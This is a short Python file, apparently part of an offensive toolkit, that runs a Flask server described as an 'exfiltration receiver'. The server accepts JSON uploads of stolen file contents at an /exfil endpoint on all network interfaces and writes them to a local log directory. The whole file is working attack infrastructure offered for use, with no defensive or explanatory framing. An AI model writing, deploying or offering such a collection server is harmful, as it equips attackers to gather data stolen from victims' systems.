# server/default_exfil_server.py
# Simple Flask server to receive exfiltrated data
# Requires: pip install flask

from flask import Flask, request, jsonify
import os
import argparse

app = Flask(__name__)

SAVE_DIR = "received_logs"

@app.route('/exfil', methods=['POST'])
def receive():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No JSON received"}), 400

    filename = data.get("filename", "unknown.txt")
    content = data.get("content", "")

    safe_path = os.path.join(SAVE_DIR, os.path.basename(filename))
    with open(safe_path, "a") as f:
        f.write(content + "\n")

    print("="*50)
    print(f"[+] Received file: {filename}")
    print(f"[+] Saved to: {safe_path}")
    print("="*50)

    return jsonify({"status": "success", "message": "Data received"}), 200

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exfiltration receiver server")
    parser.add_argument("-p", "--port", type=int, default=8000, help="Listening port (default: 8000)")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    parser.add_argument("-d", "--save-dir", default=SAVE_DIR, help="Directory to save logs (default: received_logs)")
    args = parser.parse_args()

    SAVE_DIR = args.save_dir
    os.makedirs(SAVE_DIR, exist_ok=True)

    print(f"[*] Listening for exfiltration on http://{args.host}:{args.port}/exfil")
    app.run(host=args.host, port=args.port)
